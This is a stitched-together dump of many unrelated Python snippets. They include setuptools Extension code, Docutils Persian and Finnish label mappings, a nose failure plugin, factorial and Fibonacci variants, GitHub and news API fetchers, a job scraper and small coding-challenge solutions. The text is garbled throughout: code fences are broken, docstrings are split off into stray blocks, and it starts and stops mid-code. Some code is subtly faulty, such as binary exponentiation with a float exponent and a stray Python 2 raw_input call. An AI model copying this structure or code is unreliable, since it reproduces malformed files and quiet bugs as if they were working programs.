        # arguments. py_limited_api may be set only via keyword.
        self.py_limited_api = kw.pop("py_limited_api", False)
        _Extension.__init__(self, name, sources, *args, **kw)

    def _convert_pyx_sources_to_lang(self):
        """
        Replace sources with .pyx extensions to sources with the target
        language extension. This mechanism allows language authors to supply
        pre-converted sources but to prefer the .pyx sources.
        """
        if _have_cython():
            # the build has Cython, so allow it to compile the .pyx files
            return
        lang = self.language or ""
        target_ext = ".cpp" if lang.lower() == "c++" else ".c"
        sub = functools.partial(re.sub, ".pyx$", target_ext)
        self.sources = list(map(sub, self.sources))


class Library(Extension):
    """Just like a regular Extension, but built as a library instead"""

def extraNumber(a, b, c):
    """
    You're given three integers, a, b and c. It is
    guaranteed that two of these integers are equal
    to each other. What is the value of the third integer?
    """
    if a == b:
        return c
    elif a == c:
        return b
    elif b == c:
        return a

import tarfile

fname = "spark-3.0.2-bin-hadoop2.7.tgz"

if fname.endswith("tgz"):
    tar = tarfile.open(
        "C:\\Users\\ag16000\Downloads\\spark-3.0.2-bin-hadoop2.7.tgz", "r:gz"
    )
    tar.extractall()
    tar.close()
elif fname.endswith("tar"):
    tar = tarfile.open(
        "C:\\Users\\ag16000\Downloads\\spark-3.0.2-bin-hadoop2.7.tgz", "r:"
    )
    tar.extractall()
    tar.close()

def extractEachKth(inputArray, k):
    """Function to remove each kth element from list of integers

    Args:
        inputArray(int): List of integers
        k(int): position of elements to remove from list

    Return:
        The list with kth elements removed

    Raises:
    """
    new_list = []
    for i in range(len(inputArray)):
        if (i + 1) % k != 0:
            new_list.append(inputArray[i])
    return new_list

# Try using a regex as alternative solution
# in progress, search for 59.09210
import pprint

l = [
    "0.5550.51080.446159.09210.53940.77390.85033.9272",
    "0.0150.01380.01211.59890.01460.02090.0230.1063",
]

# Split item


def split_list(seq):
    stack = []
    for item in seq:
        stack.append(item.split("."))

    # remove 0 for each col
    for row in stack:
        row.remove("0")

    ret = []

    # Append dot for each item
    for row in stack:
        for num in row:
            num = "0." + num
            num = num.rstrip("0")
            ret.append(num)

    return ret


pprint.pprint(split_list(l))

import sys
import re

from numpy.testing import jiffies, memusage


def cmdline():
    m = re.compile(r"\A\d+\Z")
    args = []
    repeat = 1
    for a in sys.argv[1:]:
        if m.match(a):
            repeat = eval(a)
        else:
            args.append(a)
    f2py_opts = " ".join(args)
    return repeat, f2py_opts


def run(runtest, test_functions, repeat=1):
    l = [(t, repr(t.__doc__.split("\n")[1].strip())) for t in test_functions]
    start_memusage = memusage()
    diff_memusage = None
    start_jiffies = jiffies()
    i = 0
    while i < repeat:
        i += 1
        for t, fname in l:
            runtest(t)
            if start_memusage is None:
                continue
            if diff_memusage is None:
                diff_memusage = memusage() - start_memusage
            else:
                diff_memusage2 = memusage() - start_memusage
                if diff_memusage2 != diff_memusage:
                    print(
                        "memory usage change at step %i:" % i,
                        diff_memusage2 - diff_memusage,
                        fname,
                    )
                    diff_memusage = diff_memusage2
    current_memusage = memusage()
    print(
        "run",
        repeat * len(test_functions),
        "tests",
        "in %.2f seconds" % ((jiffies() - start_jiffies) / 100.0),
    )
    if start_memusage:
        print("initial virtual memory size:", start_memusage, "bytes")
        print("current virtual memory size:", current_memusage, "bytes")

# -*- coding: utf-8 -*-
# $Id: fa.py 4564 2016-08-10 11:48:42Z
# Author: Shahin <me@5hah.in>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Persian-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    u"author": u"نویسنده",
    u"authors": u"نویسندگان",
    u"organization": u"سازمان",
    u"address": u"آدرس",
    u"contact": u"تماس",
    u"version": u"نسخه",
    u"revision": u"بازبینی",
    u"status": u"وضعیت",
    u"date": u"تاریخ",
    u"copyright": u"کپی‌رایت",
    u"dedication": u"تخصیص",
    u"abstract": u"چکیده",
    u"attention": u"توجه!",
    u"caution": u"احتیاط!",
    u"danger": u"خطر!",
    u"error": u"خطا",
    u"hint": u"راهنما",
    u"important": u"مهم",
    u"note": u"یادداشت",
    u"tip": u"نکته",
    u"warning": u"اخطار",
    u"contents": u"محتوا",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    u"نویسنده": u"author",
    u"نویسندگان": u"authors",
    u"سازمان": u"organization",
    u"آدرس": u"address",
    u"تماس": u"contact",
    u"نسخه": u"version",
    u"بازبینی": u"revision",
    u"وضعیت": u"status",
    u"تاریخ": u"date",
    u"کپی‌رایت": u"copyright",
    u"تخصیص": u"dedication",
    u"چکیده": u"abstract",
}```


```pyPersian (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [u"؛", u"،"]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

import pyautogui
import time

message = 1  # Here message variable stores the no. of times message prints
while message:
    time.sleep(4)
    pyautogui.typewrite(
        "Hello ,How are you?"
        "What is your today's schedule , I want a meet with you?"
        "Please reply me as early as possible."
    )
    time.sleep(2)
    pyautogui.press("enter")

from sys import stdin, stdout


def trailingZeros(N):
    mul = 5
    zeros = 0
    while True:
        zeros += N // mul
        if mul > N:
            break
        mul = mul * 5
    return zeros


for _ in range(int(stdin.readline())):
    stdout.write(str(trailingZeros(int(stdin.readline()))) + "\n")

# factorial of a positive integer -- https://en.wikipedia.org/wiki/Factorial


def factorial(n: int) -> int:
    """
    >>> import math
    >>> all(factorial(i) == math.factorial(i) for i in range(20))
    True
    >>> factorial(0.1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() only accepts integral values
    >>> factorial(-1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() not defined for negative values
    """
    if n != int(n):
        raise ValueError("factorial() only accepts integral values")
    if n < 0:
        raise ValueError("factorial() not defined for negative values")
    value = 1
    for i in range(1, n + 1):
        value *= i
    return value


if __name__ == "__main__":
    n = int(input("Enter a positive integer: ").strip() or 0)
    print(f"factorial{n} is {factorial(n)}")

def factorial(input_number: int) -> int:
    """
    Calculate the factorial of specified number

    >>> factorial(1)
    1
    >>> factorial(6)
    720
    >>> factorial(0)
    1
    >>> factorial(-1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() not defined for negative values
    >>> factorial(0.1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() only accepts integral values
    """

    if input_number < 0:
        raise ValueError("factorial() not defined for negative values")
    if not isinstance(input_number, int):
        raise ValueError("factorial() only accepts integral values")
    result = 1
    for i in range(1, input_number):
        result = result * (i + 1)
    return result


if __name__ == "__main__":
    import doctest

    doctest.testmod()

def factorial(n: int) -> int:
    """
    Calculate the factorial of a positive integer
    https://en.wikipedia.org/wiki/Factorial

    >>> import math
    >>> all(factorial(i) == math.factorial(i) for i in range(20))
    True
    >>> factorial(0.1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() only accepts integral values
    >>> factorial(-1)
    Traceback (most recent call last):
        ...
    ValueError: factorial() not defined for negative values
    """
    if not isinstance(n, int):
        raise ValueError("factorial() only accepts integral values")
    if n < 0:
        raise ValueError("factorial() not defined for negative values")
    return 1 if n == 0 or n == 1 else n * factorial(n - 1)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Factorial Trailing Zeroes

Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.

Input: 3
Output: 0
Output explanation: 3! = 6, no trailing zero.

Input: 5
Output: 1
Output explanation: 5! = 120, one trailing zero.

=========================================
Find how many 5s are in range 0-N (more explanation in the solution).
    Time Complexity:    O(logN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def trailing_zeroes(n):
    # 0s are produced when 2 and 5 are multiplied
    # because 2 * 5 = 10
    # so you'll need to count how many 2s and 5s are there
    # 2s are always more than 5s
    # so count just how many 5s are in that range
    res = 0
    k = 5

    # find all powers of 5
    # 25 has 2 5s, 125 has 3 5s, etc
    while k <= n:
        res += n // k
        k *= 5

    return res

def factors_of_a_number(num: int) -> list:
    """
    >>> factors_of_a_number(1)
    [1]
    >>> factors_of_a_number(5)
    [1, 5]
    >>> factors_of_a_number(24)
    [1, 2, 3, 4, 6, 8, 12, 24]
    >>> factors_of_a_number(-24)
    []
    """
    return [i for i in range(1, num + 1) if num % i == 0]


if __name__ == "__main__":
    num = int(input("Enter a number to find its factors: "))
    factors = factors_of_a_number(num)
    print(f"{num} has {len(factors)} factors: {', '.join(str(f) for f in factors)}")

import logging
import unittest
from traceback import format_tb
from nose.pyversion import is_base_exception

log = logging.getLogger(__name__)


__all__ = ["Failure"]


class Failure(unittest.TestCase):
    """Unloadable or unexecutable test.

    A Failure case is placed in a test suite to indicate the presence of a
    test that could not be loaded or executed. A common example is a test
    module that fails to import.

    """

    __test__ = False  # do not collect

    def __init__(self, exc_class, exc_val, tb=None, address=None):
        log.debug("A failure! %s %s %s", exc_class, exc_val, format_tb(tb))
        self.exc_class = exc_class
        self.exc_val = exc_val
        self.tb = tb
        self._address = address
        unittest.TestCase.__init__(self)

    def __str__(self):
        return "Failure: %s (%s)" % (
            getattr(self.exc_class, "__name__", self.exc_class),
            self.exc_val,
        )

    def address(self):
        return self._address

    def runTest(self):
        if self.tb is not None:
            if is_base_exception(self.exc_val):
                raise self.exc_val.with_traceback(self.tb)
            raise self.exc_class(self.exc_val).with_traceback(self.tb)
        else:
            raise self.exc_class(self.exc_val)
````

````py
This plugin provides assert introspection. When the plugin is enabled
and a test failure occurs, the traceback is displayed with extra context
around the line in which the exception was raised. Simple variable
substitution is also performed in the context output to provide more
debugging information.```


```py

from nose.plugins import Plugin
from nose.pyversion import exc_to_unicode, force_unicode
from nose.inspector import inspect_traceback


class FailureDetail(Plugin):
    """
    Plugin that provides extra information in tracebacks of test failures.
    """

    score = 1600  # before capture

    def options(self, parser, env):
        """Register commmandline options.
        """
        parser.add_option(
            "-d",
            "--detailed-errors",
            "--failure-detail",
            action="store_true",
            default=env.get("NOSE_DETAILED_ERRORS"),
            dest="detailedErrors",
            help="Add detail to error"
            " output by attempting to evaluate failed"
            " asserts [NOSE_DETAILED_ERRORS]",
        )

    def configure(self, options, conf):
        """Configure plugin.
        """
        if not self.can_configure:
            return
        self.enabled = options.detailedErrors
        self.conf = conf

    def formatFailure(self, test, err):
        """Add detail from traceback inspection to error message of a failure.
        """
        ec, ev, tb = err
        tbinfo, str_ev = None, exc_to_unicode(ev)

        if tb:
            tbinfo = force_unicode(inspect_traceback(tb))
            str_ev = "\n".join([str_ev, tbinfo])
        test.tbinfo = tbinfo
        return (ec, str_ev, tb)

#! /usr/bin/env python3
# -*- coding: utf-8; mode: python -*-```


```py Small Python 3.4 script to check the von Neumann method for generating a fair coin from a biasied one.

- Reference: https://en.wikipedia.org/wiki/Fair_coin#Fair_results_from_a_biased_coin


- *Date:* Tuesday 22 March 2016.
- *Author:* Lilian Besson, for the MVA Master, (C) 2015-16.
- *Licence:* MIT Licence (http://lbesson.mit-license.org).```


```py

# Python 2 compatibility if needed
from __future__ import print_function, division
import numpy as np


def coin(p=0.5):
    """ 1 with probability = p, 0 with probability 1 - p. """
    return 1 * (np.random.random() < p)


def vonNeumann(q=0.5):
    """ Use von Neumann's rejection algorithm with an unknown coin (Bernoulli q). """
    x, y = coin(q), coin(q)
    while x == y:  # (x, y) not in {(1, 0), (1, 0)}
        x, y = coin(q), coin(q)
    return x


def main(n=1000):
    """ Check that the von Neumann method is indeed simulating a fair coin. """
    print(
        "\n\n- Using n = {} tests of the von Neumann method, with unknown q in (0, 1).".format(
            n
        )
    )
    q = 1.0 / np.pi  # Unknown float number 0.3183098861837907
    tests = [vonNeumann(q) for _ in range(n)]
    assert all(
        i in {0, 1} for i in tests
    ), "Error of the vonNeumann function: a value outside of {0, 1} has been produced..."
    mu, sigma = np.mean(tests), np.var(tests)
    print(
        "For the values x generated by the vonNeumann(q) function:\n Average mu = {:.4g} (should be 0.5) and variance sigma = {:.4g} (should be 0.25).".format(
            mu, sigma
        )
    )
    delta_mu = abs(mu - 0.5) / 0.5
    delta_sigma = abs(sigma - 0.25) / 0.25
    print(
        "Relative errors: delta_mu = {:.5%} and delta sigma = {:.5%} (both should be small).".format(
            delta_mu, delta_sigma
        )
    )
    return mu, sigma


if __name__ == "__main__":
    for n in (10 ** i for i in range(1, 8)):
        main(n)

# End of fairCoin.py
````

````py
Module that define a custom exporter just to test the ability to invoke
nbconvert with full qualified name```


```py

from traitlets import default

from nbconvert.exporters.html import HTMLExporter


class MyExporter(HTMLExporter):
    """
    My custom exporter
    """

    @default("file_extension")
    def _file_extension_default(self):
        """
        The new file extension is `.test_ext`
        """
        return ".test_ext"

    @default("template_extension")
    def _template_extension_default(self):
        return ".html.j2"

from jupyter_client.manager import KernelManager


class FakeCustomKernelManager(KernelManager):
    expected_methods = {"__init__": 0, "client": 0, "start_kernel": 0}

    def __init__(self, *args, **kwargs):
        self.log.info("FakeCustomKernelManager initialized")
        self.expected_methods["__init__"] += 1
        super().__init__(*args, **kwargs)

    def start_kernel(self, *args, **kwargs):
        self.log.info("FakeCustomKernelManager started a kernel")
        self.expected_methods["start_kernel"] += 1
        return super().start_kernel(*args, **kwargs)

    def client(self, *args, **kwargs):
        self.log.info("FakeCustomKernelManager created a client")
        self.expected_methods["client"] += 1
        return super().client(*args, **kwargs)

def merge_sort(A):
    if len(A) > 1:
        mid = len(A) // 2
        L = A[:mid]
        R = A[mid:]

        merge_sort(L)
        merge_sort(R)

        i = j = k = 0

        while i < len(L) and j < len(R):
            if L[i] <= R[j]:
                A[k] = L[i]
                i += 1
                k += 1
            else:
                A[k] = R[j]
                j += 1
                k += 1

        while i < len(L):
            A[k] = L[i]
            i += 1
            k += 1

        while j < len(R):
            A[k] = R[j]
            j += 1
            k += 1

#!/usr/bin/env python3
````

````py
This program calculates the nth Fibonacci number in O(log(n)).
It's possible to calculate F(1_000_000) in less than a second.```


```py
from __future__ import annotations

import sys


def fibonacci(n: int) -> int:
    """
    return F(n)
    >>> [fibonacci(i) for i in range(13)]
    [0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144]
    """
    if n < 0:
        raise ValueError("Negative arguments are not supported")
    return _fib(n)[0]


# returns (F(n), F(n-1))
def _fib(n: int) -> tuple[int, int]:
    if n == 0:  # (F(0), F(1))
        return (0, 1)

    # F(2n) = F(n)[2F(n+1) − F(n)]
    # F(2n+1) = F(n+1)^2+F(n)^2
    a, b = _fib(n // 2)
    c = a * (b * 2 - a)
    d = a * a + b * b
    return (d, c + d) if n % 2 else (c, d)


if __name__ == "__main__":
    n = int(sys.argv[1])
    print(f"fibonacci({n}) is {fibonacci(n)}")
````

````py
This program calculates the nth Fibonacci number in O(log(n)).
It's possible to calculate F(1000000) in less than a second.```


```py
from __future__ import print_function
import sys


# returns F(n)
def fibonacci(n: int):  # noqa: E999 This syntax is Python 3 only
    if n < 0:
        raise ValueError("Negative arguments are not supported")
    return _fib(n)[0]


# returns (F(n), F(n-1))
def _fib(n: int):  # noqa: E999 This syntax is Python 3 only
    if n == 0:
        # (F(0), F(1))
        return (0, 1)
    else:
        # F(2n) = F(n)[2F(n+1) − F(n)]
        # F(2n+1) = F(n+1)^2+F(n)^2
        a, b = _fib(n // 2)
        c = a * (b * 2 - a)
        d = a * a + b * b
        if n % 2 == 0:
            return (c, d)
        else:
            return (d, c + d)


if __name__ == "__main__":
    args = sys.argv[1:]
    if len(args) != 1:
        print("Too few or too much parameters given.")
        exit(1)
    try:
        n = int(args[0])
    except ValueError:
        print("Could not convert data to an integer.")
        exit(1)
    print("F(%d) = %d" % (n, fibonacci(n)))

def cmp_to_key(mycmp):
    "Convert a cmp= function into a key= function"

    class K(object):
        def __init__(self, obj, *args):
            self.obj = obj

        def __lt__(self, other):
            return mycmp(self.obj, other.obj) < 0

        def __gt__(self, other):
            return mycmp(self.obj, other.obj) > 0

        def __eq__(self, other):
            return mycmp(self.obj, other.obj) == 0

        def __le__(self, other):
            return mycmp(self.obj, other.obj) <= 0

        def __ge__(self, other):
            return mycmp(self.obj, other.obj) >= 0

        def __ne__(self, other):
            return mycmp(self.obj, other.obj) != 0

    return K


def mycmp(s1, s2):
    if not s1 and not s2:
        return 0
    if not s1:
        return 1
    if not s2:
        return -1

    l1, l2 = len(s1), len(s2)
    i, j = 0, 0
    while i < l1 and j < l2:
        if s1[i].isdigit() and s2[j].isdigit():
            v1, v2 = 0, 0
            while i < l1 and s1[i].isdigit():
                v1 = v1 * 10 + int(s1[i])
                i += 1
            while j < l2 and s2[j].isdigit():
                v2 = v2 * 10 + int(s2[j])
                j += 1
            if v1 < v2:
                return -1
            if v1 > v2:
                return 1
        else:
            if s1[i] < s2[j]:
                return -1
            if s1[i] > s2[j]:
                return 1
            i += 1
            j += 1
    if i == l1 and j == l2:
        return 0
    return -1 if i == l1 else 1


s = ["ab012b", "ab12a"]
s.sort(key=cmp_to_key(mycmp))
print(s)

thm = int(0)
print("Enter the Number of Requests : ")  # Number of I/O Requests
req = int(input())
print("Enter the Initial Head Position : ")  # Initial Position of Disk Head
hp = int(input())
print("Enter the Seek Rate : ")
srate = int(input())
print("Enter the Requests : ")
arr = [int(input()) for i in range(req)]
thm = thm + abs(hp - arr[0])
print(str(hp) + " -> " + str(arr[0]), end="")
for i in range(1, req):  # Iterates in Order of Arrival
    thm = thm + abs(arr[i] - arr[i - 1])
    print(" -> " + str(arr[i]), end="")
stime = srate * thm
print("\nThe Total Head Movement is", thm)
print("The Seek Time is", stime)

class FenwickTree:
    def __init__(self, SIZE):  # create fenwick tree with size SIZE
        self.Size = SIZE
        self.ft = [0 for i in range(0, SIZE)]

    def update(self, i, val):  # update data (adding) in index i in O(lg N)
        while i < self.Size:
            self.ft[i] += val
            i += i & (-i)

    def query(self, i):  # query cumulative data from index 0 to i in O(lg N)
        ret = 0
        while i > 0:
            ret += self.ft[i]
            i -= i & (-i)
        return ret


if __name__ == "__main__":
    f = FenwickTree(100)
    f.update(1, 20)
    f.update(4, 4)
    print(f.query(1))
    print(f.query(3))
    print(f.query(4))
    f.update(2, -5)
    print(f.query(1))
    print(f.query(3))

# Python program to show the usage of Fermat's little theorem in a division
# According to Fermat's little theorem, (a / b) mod p always equals
# a * (b ^ (p - 2)) mod p
# Here we assume that p is a prime number, b divides a, and p doesn't divide b
# Wikipedia reference: https://en.wikipedia.org/wiki/Fermat%27s_little_theorem


def binary_exponentiation(a, n, mod):

    if n == 0:
        return 1

    elif n % 2 == 1:
        return (binary_exponentiation(a, n - 1, mod) * a) % mod

    else:
        b = binary_exponentiation(a, n / 2, mod)
        return (b * b) % mod


# a prime number
p = 701

a = 1000000000
b = 10

# using binary exponentiation function, O(log(p)):
print((a / b) % p == (a * binary_exponentiation(b, p - 2, p)) % p)

# using Python operators:
print((a / b) % p == (a * b ** (p - 2)) % p)

# Created by sarathkaul on 12/11/19

import requests

_NEWS_API = "https://newsapi.org/v1/articles?source=bbc-news&sortBy=top&apiKey="


def fetch_bbc_news(bbc_news_api_key: str) -> None:
    # fetching a list of articles in json format
    bbc_news_page = requests.get(_NEWS_API + bbc_news_api_key).json()
    # each article in the list is a dict
    for i, article in enumerate(bbc_news_page["articles"], 1):
        print(f"{i}.) {article['title']}")


if __name__ == "__main__":
    fetch_bbc_news(bbc_news_api_key="<Your BBC News API key goes here>")

#!/usr/bin/env python3```


```py
Created by sarathkaul on 14/11/19
Updated by lawric1 on 24/11/20

Authentication will be made via access token.
To generate your personal access token visit https://github.com/settings/tokens.

NOTE:
Never hardcode any credential information in the code. Always use an environment
file to store the private information and use the `os` module to get the information
during runtime.

Create a ".env" file in the root directory and write these two lines in that file
with your token::

#!/usr/bin/env bash
export USER_TOKEN=""```


```py
import os
from typing import Any, Dict

import requests

BASE_URL = "https://api.github.com"

# https://docs.github.com/en/free-pro-team@latest/rest/reference/users#get-the-authenticated-user
AUTHENTICATED_USER_ENDPOINT = BASE_URL + "/user"

# https://github.com/settings/tokens
USER_TOKEN = os.environ.get("USER_TOKEN", "")


def fetch_github_info(auth_token: str) -> Dict[Any, Any]:
    """
    Fetch GitHub info of a user using the requests module
    """
    headers = {
        "Authorization": f"token {auth_token}",
        "Accept": "application/vnd.github.v3+json",
    }
    return requests.get(AUTHENTICATED_USER_ENDPOINT, headers=headers).json()


if __name__ == "__main__":  # pragma: no cover
    if USER_TOKEN:
        for key, value in fetch_github_info(USER_TOKEN).items():
            print(f"{key}: {value}")
    else:
        raise ValueError("'USER_TOKEN' field cannot be empty.")
````

````py
Scraping jobs given job title and location from indeed website```


```py
from __future__ import annotations

from typing import Generator

import requests
from bs4 import BeautifulSoup

url = "https://www.indeed.co.in/jobs?q=mobile+app+development&l="


def fetch_jobs(location: str = "mumbai") -> Generator[tuple[str, str], None, None]:
    soup = BeautifulSoup(requests.get(url + location).content, "html.parser")
    # This attribute finds out all the specifics listed in a job
    for job in soup.find_all("div", attrs={"data-tn-component": "organicJob"}):
        job_title = job.find("a", attrs={"data-tn-element": "jobTitle"}).text.strip()
        company_name = job.find("span", {"class": "company"}).text.strip()
        yield job_title, company_name


if __name__ == "__main__":
    for i, job in enumerate(fetch_jobs("Bangalore"), 1):
        print(f"Job {i:>2} is {job[0]} at {job[1]}")

#!/usr/bin/env python3```


```pyUse several threads to download enclosures from RSS feeds.```


```py

# end_pymotw_header
from queue import Queue
import threading
import time
import urllib
from urllib.parse import urlparse

import feedparser

# Set up some global variables
num_fetch_threads = 2
enclosure_queue = Queue()

# A real app wouldn't use hard-coded data...
feed_urls = ["http://talkpython.fm/episodes/rss"]


def message(s):
    print("{}: {}".format(threading.current_thread().name, s))


def download_enclosures(q):
    """This is the worker thread function.
    It processes items in the queue one after
    another.  These daemon threads go into an
    infinite loop, and exit only when
    the main thread ends.
    """
    while True:
        message("looking for the next enclosure")
        url = q.get()
        filename = url.rpartition("/")[-1]
        message("downloading {}".format(filename))
        response = urllib.request.urlopen(url)
        data = response.read()
        # Save the downloaded file to the current directory
        message("writing to {}".format(filename))
        with open(filename, "wb") as outfile:
            outfile.write(data)
        q.task_done()


# Set up some threads to fetch the enclosures
for i in range(num_fetch_threads):
    worker = threading.Thread(
        target=download_enclosures, args=(enclosure_queue,), name="worker-{}".format(i)
    )
    worker.setDaemon(True)
    worker.start()

# Download the feed(s) and put the enclosure URLs into
# the queue.
for url in feed_urls:
    response = feedparser.parse(url, agent="fetch_podcasts.py")
    for entry in response["entries"][:5]:
        for enclosure in entry.get("enclosures", []):
            parsed_url = urlparse(enclosure["url"])
            message("queuing {}".format(parsed_url.path.rpartition("/")[-1]))
            enclosure_queue.put(enclosure["url"])

# Now wait for the queue to be empty, indicating that we have
# processed all of the downloads.
message("*** main thread waiting")
enclosure_queue.join()
message("*** done")

# $Id: fi.py 4564 2006-05-21 20:44:42Z wiemann $
# Author: Asko Soukka <asko.soukka@iki.fi>
# Copyright: This module has been placed in the public domain.

# New language mappings are welcome.  Before doing a new translation, please
# read <http://docutils.sf.net/docs/howto/i18n.html>.  Two files must be
# translated for each language: one in docutils/languages, the other in
# docutils/parsers/rst/languages.
````

````py
Finnish-language mappings for language-dependent features of Docutils.```


```py

__docformat__ = "reStructuredText"

labels = {
    # fixed: language-dependent
    u"author": u"Tekij\u00e4",
    u"authors": u"Tekij\u00e4t",
    u"organization": u"Yhteis\u00f6",
    u"address": u"Osoite",
    u"contact": u"Yhteystiedot",
    u"version": u"Versio",
    u"revision": u"Vedos",
    u"status": u"Tila",
    u"date": u"P\u00e4iv\u00e4ys",
    u"copyright": u"Tekij\u00e4noikeudet",
    u"dedication": u"Omistuskirjoitus",
    u"abstract": u"Tiivistelm\u00e4",
    u"attention": u"Huomio!",
    u"caution": u"Varo!",
    u"danger": u"!VAARA!",
    u"error": u"Virhe",
    u"hint": u"Vihje",
    u"important": u"T\u00e4rke\u00e4\u00e4",
    u"note": u"Huomautus",
    u"tip": u"Neuvo",
    u"warning": u"Varoitus",
    u"contents": u"Sis\u00e4llys",
}```


```pyMapping of node class name to label text."""

bibliographic_fields = {
    # language-dependent: fixed
    u"tekij\u00e4": u"author",
    u"tekij\u00e4t": u"authors",
    u"yhteis\u00f6": u"organization",
    u"osoite": u"address",
    u"yhteystiedot": u"contact",
    u"versio": u"version",
    u"vedos": u"revision",
    u"tila": u"status",
    u"p\u00e4iv\u00e4ys": u"date",
    u"tekij\u00e4noikeudet": u"copyright",
    u"omistuskirjoitus": u"dedication",
    u"tiivistelm\u00e4": u"abstract",
}```


```pyFinnish (lowcased) to canonical name mapping for bibliographic fields."""

author_separators = [";", ","]```


```pyList of separator strings for the 'Authors' bibliographic field. Tried in
order."""

def fib_iter(n):

    if n == 0:
        return 0

    if n == 1:
        return 1

    p0 = 0
    p1 = 1

    for i in range(n - 1):
        next_val = p0 + p1

        p0 = p1
        p1 = next_val

    return next_val


for i in range(10):
    print(f"{i}: {fib_iter(i)}")

def fib_series(count):
    a = 0
    b = 1
    c = 1
    for i in range(count):
        a = b
        b = c
        c = a + b
        print(a)


fib_series(10)

class Solution:
    def fib(self, N: int) -> int:
        if N == 0:
            return 0
        if N == 1:
            return 1
        dp = [0 for _ in range(N + 1)]
        dp[1] = 1
        for i in range(2, N + 1):
            dp[i] = dp[i - 1] + dp[i - 2]
        return dp[-1]

# Fibonacci Sequence Using Recursion


def recur_fibo(n: int) -> int:
    """
    >>> [recur_fibo(i) for i in range(12)]
    [0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89]
    """
    return n if n <= 1 else recur_fibo(n - 1) + recur_fibo(n - 2)


def main() -> None:
    limit = int(input("How many terms to include in fibonacci series: "))
    if limit > 0:
        print(f"The first {limit} terms of the fibonacci series are as follows:")
        print([recur_fibo(n) for n in range(limit)])
    else:
        print("Please enter a positive integer: ")


if __name__ == "__main__":
    main()

while 2 == 2:
    print("_________________________________________________")
    print(
        """Program can determine till 6 angles only.
   and remember if you have angles less than 6 simply enter 0"""
    )
    print("_________________________________________________")
    get = int(input("Enter first angle:"))
    print("_________________________________________________")
    get_again = int(input("Enter second angle:"))
    print("_________________________________________________")
    get_again_again = int(input("Enter third angle:"))
    print("_________________________________________________")
    get_it = int(input("Enter fourth angle:"))
    print("_________________________________________________")
    get_it_it = int(input("Enter fifth angle:"))
    print("_________________________________________________")
    getting = int(input("Enter sixth angle:"))
    print("_________________________________________________")

    if get + get_again + get_again_again + get_it + get_it_it + getting == 180:
        print("The figure is Triangle or linear pair of angles")
        print("_________________________________________________")
    elif get + get_again + get_again_again + get_it + get_it_it + getting == 360:
        print("The figure is Quadrilateral ")
    elif get + get_again + get_again_again + get_it + get_it_it + getting == 540:
        print("The figure is Pentagon")
    elif get + get_again + get_again_again + get_it + get_it_it + getting == 720:
        print("The figure is Hexagon")

    feature = raw_input("Start again or End:")
    if feature == "Start again":
        print("Starting again...")
        print("Started again")
        continue
    elif feature == "End":
        print("Program Ended...")
        print("_________________________________________________")
        print(" ")
        break

# Copyright (c) 2014 Doug Hellmann.  All rights reserved.
#
#
#                         All Rights Reserved
#

#

#```


```pyExtension to allow references to figures.```


```py

import functools

from docutils import nodes, utils

from sphinx.util import logging

LOG = logging.getLogger(__name__)


class figureref(nodes.reference):
    pass


def _role(typ, rawtext, text, lineno, inliner, options={}, content=[], nodeclass=None):
    text = utils.unescape(text)
    pnode = nodeclass(rawsource=text, text="", internal=True, refuri=text)
    return [pnode], []


def latex_visit_figureref(self, node):
    id = "figure:" + node["refuri"]
    self.body.append(r"Figure~\ref{%s}" % self.idescape(id))
    raise nodes.SkipNode


def latex_depart_figureref(self, node):
    return


def html_visit_figureref(self, node):
    self.body.append(r"the figure")
    raise nodes.SkipNode


def html_depart_figureref(self, node):
    return


def builder_inited(app):
    LOG.info("defining figure role")
    app.add_role("figure", functools.partial(_role, nodeclass=figureref))


def setup(app):
    LOG.info("initializing figureref")
    app.add_node(
        figureref,
        latex=(latex_visit_figureref, None),
        html=(html_visit_figureref, html_depart_figureref),
    )
    app.connect("builder-inited", builder_inited)
````

````py
    File Downloader
        This python script will help users to download any kind of files, irrespective of their size from the internet.<br>
        You just need to have the url and you are good to go!```


```py
import os
import requests
from tqdm import tqdm
import math
import time

url = input("Enter the url of the file you want to download: ")

r = requests.get(url)
# receives data from the url

file_size = int(r.headers["Content-Length"])
chunk_size = 256
````

````pyChunk size is the
number of bytes downloaded at a time```


```py

r = requests.get(url, stream=True)
````

````pystreams=True ensures that
will not get data at once, but will get data one by one```


```py

extension = (os.path.splitext(url))[-1]
file = "file" + extension

iterations = math.ceil(file_size / chunk_size)

with open(file, "wb") as file:
    for chunk in tqdm(r.iter_content(chunk_size=chunk_size), total=iterations):
        time.sleep(0.5)
        file.write(chunk)

import os
from pathlib import Path
from typing import Union


class FileIO:
    def __init__(self, path: Union[os.PathLike, str]):
        if isinstance(path, str):
            path = Path(path)
        self.path = path

    def read(self):  # Returns bytes/str
        # We would like to read unicode here, but we cannot, because we are not
        # sure if it is a valid unicode file. Therefore just read whatever is
        # here.
        with open(self.path, "rb") as f:
            return f.read()

    def get_last_modified(self):
        """
        Returns float - timestamp or None, if path doesn't exist.
        """
        try:
            return os.path.getmtime(self.path)
        except FileNotFoundError:
            return None

    def __repr__(self):
        return "%s(%s)" % (self.__class__.__name__, self.path)


class KnownContentFileIO(FileIO):
    def __init__(self, path, content):
        super().__init__(path)
        self._content = content

    def read(self):
        return self._content

def fileNaming(names):
    """
    Since two files cannot have equal names,
    the one which comes later will have an addition
    to its name in a form of (k), where k is the smallest
    positive integer such that the obtained name is not
    used yet. Return an array of names that will be given
    to the files.
    """
    new_file_names = []
    for name in names:
        if name in new_file_names:
            k = 1
            while "{}({})".format(name, k) in new_file_names:
                k += 1
